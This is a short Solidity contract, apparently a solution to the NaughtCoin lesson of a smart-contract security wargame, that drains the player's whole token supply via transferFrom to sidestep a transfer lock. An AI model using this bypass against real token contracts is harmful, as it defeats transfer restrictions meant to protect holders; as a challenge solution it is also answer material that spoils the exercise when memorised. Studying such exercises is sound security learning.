// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/15-NaughtCoin.sol";

contract NaughtCoinAttack {
    NaughtCoin naughtCoin;

    constructor(address _naughtCoinAddress) public {
        naughtCoin = NaughtCoin(_naughtCoinAddress);
    }

    function attack() public {
        // attacker must approve this contract to spend their NaughtCoin before calling attack()
        naughtCoin.transferFrom(msg.sender, address(this), naughtCoin.INITIAL_SUPPLY());
    }
}
